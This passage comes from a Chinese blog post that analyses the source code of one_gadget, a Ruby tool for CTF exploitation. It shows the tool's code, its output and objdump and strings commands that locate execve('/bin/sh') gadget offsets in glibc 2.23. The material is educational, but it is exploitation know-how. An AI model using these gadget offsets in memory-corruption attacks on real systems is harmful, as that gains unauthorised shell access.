  ├── libc-2.26-ddcc13122ddbfe5e5ef77d4ebe66d124ae5762c2.so</span><br><span class="line">│   │   ├── libc-2.26-f65648a832414f2144ce795d75b6045a1ec2e252.so</span><br><span class="line">│   │   ├── libc-2.27-63b3d43ad45e1b0f601848c65b067f9e9b40528b.so</span><br><span class="line">│   │   ├── libc-2.27-b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0.so</span><br><span class="line">│   │   └── test_near_file.elf</span><br><span class="line">│   ├── emulators</span><br><span class="line">│   │   ├── aarch64_spec.rb</span><br><span class="line">│   │   ├── amd64_spec.rb</span><br><span class="line">│   │   ├── i386_spec.rb</span><br><span class="line">│   │   ├── instruction_spec.rb</span><br><span class="line">│   │   └── lambda_spec.rb</span><br><span class="line">│   ├── gadget_spec.rb</span><br><span class="line">│   ├── helper_spec.rb</span><br><span class="line">│   ├── one_gadget_aarch64_spec.rb</span><br><span class="line">│   ├── one_gadget_amd64_spec.rb</span><br><span class="line">│   ├── one_gadget_i386_spec.rb</span><br><span class="line">│   ├── spec_helper.rb</span><br><span class="line">│   └── update_spec.rb</span><br><span class="line">└── tasks</span><br><span class="line">    ├── builds</span><br><span class="line">    │   ├── generate.rake</span><br><span class="line">    │   └── list.rake</span><br><span class="line">    └── readme.rake</span><br><span class="line"></span><br><span class="line">12 directories, 787 files</span><br></pre></td></tr></table></figure><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>以下的分析仅仅是我个人的想法，因为我也不了解 ruby，只是单纯地推测代码的含义。如果有错误，欢迎大佬指正。接下来我逐个按照文件来进行分析：</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>存放了<code>one_gadget</code>可执行文件</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="comment"># frozen_string_literal: true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">'one_gadget/cli'</span></span><br><span class="line"></span><br><span class="line">exit OneGadget::CLI.work(ARGV.dup)</span><br></pre></td></tr></table></figure><p>也可以看出<code>lib/one_gadget/cli.rb</code>中肯定调用了具体的算法</p><h2 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h2><p>不同架构下<code>one_gadget</code>的执行效果图</p><h2 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h2><p><code>lib</code>下分为一个<code>one_gadget</code>的文件夹和一个源文件<code>one_gadget.rb</code></p><h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><p>这里应该就是<code>one_gadget</code>的源码，先看<code>lib/one_gadget/cli.rb</code>，其中定义了一个<code>work</code>函数，也就是二进制文件中调用的部分：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="comment"># Main method of CLI.</span></span><br><span class="line">    <span class="comment"># <span class="doctag">@param</span> [Array&lt;String&gt;] argv</span></span><br><span class="line">    <span class="comment">#   Command line arguments.</span></span><br><span class="line">    <span class="comment"># <span class="doctag">@return</span> [Boolean]</span></span><br><span class="line">    <span class="comment">#   Whether the command execute successfully.</span></span><br><span class="line">    <span class="comment"># <span class="doctag">@example</span></span></span><br><span class="line">    <span class="comment">#   CLI.work(%w[--help])</span></span><br><span class="line">    <span class="comment">#   # usage message</span></span><br><span class="line">    <span class="comment">#   #=&gt; true</span></span><br><span class="line">    <span class="comment">#   CLI.work(%w[--version])</span></span><br><span class="line">    <span class="comment">#   # version message</span></span><br><span class="line">    <span class="comment">#   #=&gt; true</span></span><br><span class="line">    <span class="comment"># <span class="doctag">@example</span></span></span><br><span class="line">    <span class="comment">#   CLI.work([])</span></span><br><span class="line">    <span class="comment">#   # usage message</span></span><br><span class="line">    <span class="comment">#   #=&gt; false</span></span><br><span class="line">    <span class="comment"># <span class="doctag">@example</span></span></span><br><span class="line">    <span class="comment">#   CLI.work(%w[-b b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0 -r])</span></span><br><span class="line">    <span class="comment">#   # 324293 324386 1090444</span></span><br><span class="line">    <span class="comment">#   #=&gt; true</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>看一下注释大概知道了就是解析输入的参数，然后再对不同的函数进行调用</p><p><code>lib/one_gadget/helper.rb</code>中定义了对输入文件信息的一些判断和一些美化操作，以<code>architecture</code>函数为例，就是对使用的指令架构做了一个判断：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Fetch the ELF archiecture of +file+.</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> [String] file The target ELF filename.</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> [Symbol]</span></span><br><span class="line"><span class="comment">#   Currently supports amd64, i386, arm, aarch64, and mips.</span></span><br><span class="line"><span class="comment"># <span class="doctag">@example</span></span></span><br><span class="line"><span class="comment">#   Helper.architecture('/bin/cat')</span></span><br><span class="line"><span class="comment">#   #=&gt; :amd64</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">architecture</span><span class="params">(file)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="symbol">:invalid</span> <span class="keyword">unless</span> File.exist?(file)</span><br><span class="line"></span><br><span class="line">  f = File.open(file)</span><br><span class="line">  str = ELFTools::ELFFile.new(f).machine</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">'Advanced Micro Devices X86-64'</span> =&gt; <span class="symbol">:amd64</span>,</span><br><span class="line">    <span class="string">'Intel 80386'</span> =&gt; <span class="symbol">:i386</span>,</span><br><span class="line">    <span class="string">'ARM'</span> =&gt; <span class="symbol">:arm</span>,</span><br><span class="line">    <span class="string">'AArch64'</span> =&gt; <span class="symbol">:aarch64</span>,</span><br><span class="line">    <span class="string">'MIPS R3000'</span> =&gt; <span class="symbol">:mips</span></span><br><span class="line">  &#125;[str] <span class="params">||</span> <span class="symbol">:unknown</span></span><br><span class="line"><span class="keyword">rescue</span> ELFTools::ELFError <span class="comment"># not a valid ELF</span></span><br><span class="line">  <span class="symbol">:invalid</span></span><br><span class="line"><span class="keyword">ensure</span></span><br><span class="line">  f&amp;.close</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>接下来直接看看关键的函数<code>lib/one_gadget/one_gadget.rb</code>。这里面调用了找<code>one_gadget</code>的源文件<code>fetcher.rb</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">require</span> <span class="string">'one_gadget/fetcher'</span></span><br><span class="line">...</span><br><span class="line">    <span class="comment"># The man entry of gem +one_gadget+.</span></span><br><span class="line">    <span class="comment"># If want to find gadgets from file, it will search gadgets by its</span></span><br><span class="line">    <span class="comment"># build id first.</span></span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gadgets</span><span class="params">(<span class="symbol">file:</span> <span class="literal">nil</span>, <span class="symbol">build_id:</span> <span class="literal">nil</span>, <span class="symbol">details:</span> <span class="literal">false</span>, <span class="symbol">force_file:</span> <span class="literal">false</span>, <span class="symbol">level:</span> <span class="number">0</span>)</span></span></span><br><span class="line">      ret = <span class="keyword">if</span> build_id</span><br><span class="line">              OneGadget::Fetcher.from_build_id(build_id) <span class="params">||</span> OneGadget::Logger.not_found(build_id)</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              from_file(OneGadget::Helper.abspath(file), <span class="symbol">force:</span> force_file)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">      ret = refine_gadgets(ret, level)</span><br><span class="line">      ret = ret.map(&amp;<span class="symbol">:offset</span>) <span class="keyword">unless</span> details</span><br><span class="line">      ret</span><br><span class="line">    <span class="keyword">rescue</span> OneGadget::Error::Error =&gt; e</span><br><span class="line">      OneGadget::Logger.error(<span class="string">"<span class="subst">#&#123;e.<span class="keyword">class</span>.name.split(<span class="string">'::'</span>).last&#125;</span>: <span class="subst">#&#123;e.message&#125;</span>"</span>)</span><br><span class="line">      []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到注释里大概说了一下过程，这个函数就是<code>one_gadget</code>的“<code>main</code>”函数，会调用<code>fetcher.rb</code>中的函数，去<code>builds</code>文件夹里已经找到的<code>one_gadget</code>是否符合</p><p>接下来看<code>lib/one_gadget/fetcher.rb</code>，各个架构下的情况分别调用了各自对应的文件</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">require</span> <span class="string">'one_gadget/fetchers/aarch64'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'one_gadget/fetchers/amd64'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'one_gadget/fetchers/i386'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'one_gadget/gadget'</span></span><br><span class="line">...</span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">from_build_id</span><span class="params">(build_id, <span class="symbol">remote:</span> <span class="literal">true</span>)</span></span></span><br><span class="line">        OneGadget::Helper.verify_build_id!(build_id)</span><br><span class="line">        OneGadget::Gadget.builds(build_id, <span class="symbol">remote:</span> remote)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">...</span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">from_file</span><span class="params">(file)</span></span></span><br><span class="line">        arch = OneGadget::Helper.architecture(file)</span><br><span class="line">        klass = &#123;</span><br><span class="line">          <span class="symbol">aarch64:</span> OneGadget::Fetcher::AArch64,</span><br><span class="line">          <span class="symbol">amd64:</span> OneGadget::Fetcher::Amd64,</span><br><span class="line">          <span class="symbol">i386:</span> OneGadget::Fetcher::I386</span><br><span class="line">        &#125;[arch]</span><br><span class="line">        raise Error::UnsupportedArchitectureError, arch <span class="keyword">if</span> klass.<span class="literal">nil</span>?</span><br><span class="line"></span><br><span class="line">        trim_gadgets(klass.new(file).find)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然后是<code>lib/one_gadget/fetchers/base.rb</code>，每种架构下获取<code>one_gadget</code>的方法都以这个函数为基础</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">resolve</span><span class="params">(processor)</span></span></span><br><span class="line">        call = processor.registers[processor.pc].to_s</span><br><span class="line">        <span class="comment"># This costs cheaper, so check first.</span></span><br><span class="line">        <span class="comment"># check call execve / execl</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">unless</span> <span class="string">%w[execve execl]</span>.any? &#123; <span class="params">|n|</span> call.<span class="keyword">include</span>?(n) &#125;</span><br><span class="line">        <span class="comment"># check first argument contains /bin/sh</span></span><br><span class="line">        <span class="comment"># since the logic is different between amd64 and i386,</span></span><br><span class="line">        <span class="comment"># invoke str_bin_sh? for checking</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">unless</span> str_bin_sh?(processor.argument(<span class="number">0</span>).to_s)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> call.<span class="keyword">include</span>?(<span class="string">'execve'</span>)</span><br><span class="line">          resolve_execve(processor)</span><br><span class="line">        <span class="keyword">elsif</span> call.<span class="keyword">include</span>?(<span class="string">'execl'</span>)</span><br><span class="line">          resolve_execl(processor)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">resolve_execve</span><span class="params">(processor)</span></span></span><br><span class="line">        <span class="comment"># arg[1] == NULL || [arg[1]] == NULL</span></span><br><span class="line">        <span class="comment"># arg[2] == NULL || [arg[2]] == NULL || arg[2] == envp</span></span><br><span class="line">        arg1 = processor.argument(<span class="number">1</span>).to_s</span><br><span class="line">        arg2 = processor.argument(<span class="number">2</span>).to_s</span><br><span class="line">        cons = processor.constraints</span><br><span class="line">        cons &lt;&lt; check_execve_arg(processor, arg1)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">unless</span> cons.all?</span><br><span class="line"></span><br><span class="line">        envp = <span class="string">'environ'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">unless</span> check_envp(processor, arg2) <span class="keyword">do</span> <span class="params">|c|</span></span><br><span class="line">          cons &lt;&lt; c</span><br><span class="line">          envp = arg2</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        &#123; <span class="symbol">constraints:</span> cons, <span class="symbol">effect:</span> <span class="string">%(execve("/bin/sh", <span class="subst">#&#123;arg1&#125;</span>, <span class="subst">#&#123;envp&#125;</span>)</span>) &#125;</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># arg[1] == NULL || [arg[1]] == NULL</span></span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">check_execve_arg</span><span class="params">(processor, arg)</span></span></span><br><span class="line">        <span class="keyword">if</span> arg.start_with?(processor.sp) <span class="comment"># arg = sp+&lt;num&gt;</span></span><br><span class="line">          <span class="comment"># in this case, the only constraint is [sp+&lt;num&gt;] == NULL</span></span><br><span class="line">          num = Integer(arg[processor.sp.size..-<span class="number">1</span>])</span><br><span class="line">          slot = processor.stack[num].to_s</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">if</span> global_var?(slot)</span><br><span class="line"></span><br><span class="line">          <span class="string">"<span class="subst">#&#123;slot&#125;</span> == NULL"</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="string">"[<span class="subst">#&#123;arg&#125;</span>] == NULL || <span class="subst">#&#123;arg&#125;</span> == NULL"</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">check_envp</span><span class="params">(processor, arg)</span></span></span><br><span class="line">        <span class="comment"># if str starts with [[ and is global var,</span></span><br><span class="line">        <span class="comment"># believe it is environ</span></span><br><span class="line">        <span class="comment"># if starts with [[ but not global, drop it.</span></span><br><span class="line">        <span class="keyword">return</span> global_var?(arg) <span class="keyword">if</span> arg.start_with?(<span class="string">'[['</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># normal</span></span><br><span class="line">        cons = check_execve_arg(processor, arg)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">if</span> cons.<span class="literal">nil</span>?</span><br><span class="line"></span><br><span class="line">        <span class="keyword">yield</span> cons</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">...</span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">str_bin_sh?</span><span class="params">(_str)</span></span>; raise NotImplementedError</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到先是找到字符串<code>&quot;/bin/sh&quot;</code>，然后检查是否<code>call</code>了<code>execve</code>，最后再检查另外两个参数的情况，最后就能得到<code>one_gadget</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">λ one_gadget libc.so</span><br><span class="line">0x3c0cb execve(<span class="string">"/bin/sh"</span>, rsp+0x20, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x20] == NULL</span><br><span class="line"></span><br><span class="line">0xcb795 execve(<span class="string">"/bin/sh"</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0xcb79a execve(<span class="string">"/bin/sh"</span>, rsi, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br></pre></td></tr></table></figure><h2 id="spec"><a href="#spec" class="headerlink" title="spec"></a>spec</h2><p>这里放了一些常用 libc 的<code>one_gadget</code></p><h2 id="tasks"><a href="#tasks" class="headerlink" title="tasks"></a>tasks</h2><p>应该是一些编译的选项设置</p><h1 id="Complement"><a href="#Complement" class="headerlink" title="Complement"></a>Complement</h1><p>分析完之后再看看<a href="https://david942j.blogspot.com/2017/02/project-one-gadget-in-glibc.html" target="_blank" rel="noopener">作者 david942j 的介绍</a></p><h2 id="64-Bit"><a href="#64-Bit" class="headerlink" title="64 Bit"></a>64 Bit</h2><p>这里首先以 64 位下的<code>libc-2.23.so</code>为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ file /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/l, BuildID[sha1]=1ca54a6e0d76188105b12e49fe6b8019bf08803a, <span class="keyword">for</span> GNU/Linux 2.6.32, stripped</span><br></pre></td></tr></table></figure><p>先看看能够找到的<code>one_gadget</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">λ one_gadget /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x45216 execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(<span class="string">"/bin/sh"</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>以第二个<code>one_gadget</code>为例，看一下这部分反汇编的代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">λ objdump -d /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">...</span><br><span class="line">   4526a:48 8b 05 47 ec 37 00 mov    rax,QWORD PTR [rip+0x37ec47]        <span class="comment"># 3c3eb8 &lt;_IO_file_jumps@@GLIBC_2.2.5+0x7d8&gt;</span></span><br><span class="line">   45271:48 8d 3d df 7a 14 00 lea    rdi,[rip+0x147adf]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   45278:48 8d 74 24 30       lea    rsi,[rsp+0x30]</span><br><span class="line">   4527d:c7 05 19 12 38 00 00 mov    DWORD PTR [rip+0x381219],0x0        <span class="comment"># 3c64a0 &lt;__abort_msg@@GLIBC_PRIVATE+0x8c0&gt;</span></span><br><span class="line">   45284:00 00 00</span><br><span class="line">   45287:c7 05 13 12 38 00 00 mov    DWORD PTR [rip+0x381213],0x0        <span class="comment"># 3c64a4 &lt;__abort_msg@@GLIBC_PRIVATE+0x8c4&gt;</span></span><br><span class="line">   4528e:00 00 00</span><br><span class="line">   45291:48 8b 10             mov    rdx,QWORD PTR [rax]</span><br><span class="line">   45294:e8 d7 74 08 00       call   cc770 &lt;execve@@GLIBC_2.2.5&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>第<code>45271</code>行的汇编等价于<code>rdi = libc_base + 0x18cd57</code>，可以看到<code>libc_base + 0x18cd57</code>就是字符串<code>/bin/sh</code>的位置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ strings -tx /lib/x86_64-linux-gnu/libc-2.23.so | grep <span class="string">"/bin/sh"</span></span><br><span class="line"> 18cd57 /bin/sh</span><br></pre></td></tr></table></figure><p>再<code>grep</code>一下可以看到有很多类似的<code>gadgets</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">λ objdump -d /lib/x86_64-linux-gnu/libc-2.23.so | grep <span class="string">"18cd57"</span></span><br><span class="line">   45271:48 8d 3d df 7a 14 00 lea    rdi,[rip+0x147adf]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   6f5a6:48 8d 3d aa d7 11 00 lea    rdi,[rip+0x11d7aa]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   cce31:48 8d 05 1f ff 0b 00 lea    rax,[rip+0xbff1f]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   cd078:48 8d 0d d8 <span class="built_in">fc</span> 0b 00 lea    rcx,[rip+0xbfcd8]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   cd0f3:48 8d 3d 5d <span class="built_in">fc</span> 0b 00 lea    rdi,[rip+0xbfc5d]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   cd1c8:48 8d 3d 88 fb 0b 00 lea    rdi,[rip+0xbfb88]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   f01b0:48 8d 05 a0 cb 09 00 lea    rax,[rip+0x9cba0]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   f02b0:48 8d 3d a0 ca 09 00 lea    rdi,[rip+0x9caa0]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   f02c4:48 8d 05 8c ca 09 00 lea    rax,[rip+0x9ca8c]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   f0fcc:48 8d 05 84 bd 09 00 lea    rax,[rip+0x9bd84]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   f10fc:48 8d 05 54 bc 09 00 lea    rax,[rip+0x9bc54]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   f1153:48 8d 3d fd bb 09 00 lea    rdi,[rip+0x9bbfd]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   f6276:48 8d 3d da 6a 09 00 lea    rdi,[rip+0x96ada]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   f6643:48 8d 05 0d 67 09 00 lea    rax,[rip+0x9670d]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   f66f0:48 8d 3d 60 66 09 00 lea    rdi,[rip+0x96660]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br><span class="line">   ff8ae:48 8d 05 a2 d4 08 00 lea    rax,[rip+0x8d4a2]        <span class="comment"># 18cd57 &lt;_libc_intl_domainname@@GLIBC_2.2.5+0x197&gt;</span></span><br></pre></td></tr></table></figure><p>再回到上面的汇编片段，第<code>45278</code>行等价于<code>rsi = rsp + 0x30</code>，那么基本可以判断出上面这一部分的<code>gadget</code>等价于<code>execve(&quot;/bin/sh&quot;, rsp+0x30, environ);</code>，可以成功 Get Shell</p><p>那么 64 位下<code>one_gadget</code>的实现原理就可以总结成三步：</p><ol><li>找到有字符串<code>&quot;/bin/sh&quot;</code>的<code>gadgets</code></li><li>筛选出附近有调用<code>execve</code>的<code>gadgets</code></li><li>最后找出<code>gadget</code>中含有类似<code>lea rsi,[rsp+0x??]</code>的即为<code>one_gadget</code></li></ol><h2 id="32Bit"><a href="#32Bit" class="headerlink" title="32Bit"></a>32Bit</h2><p>接下来看看 32 位下的<code>libc-2.23.so</code>，找<code>one_gadget</code>的方法就不太一样了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ file /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">/lib/i386-linux-gnu/libc-2.23.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-, BuildID[sha1]=2052ef79d1bb69a8f5c5340eee984f2659b75e39, <span class="keyword">for</span> GNU/Linux 2.6.32, 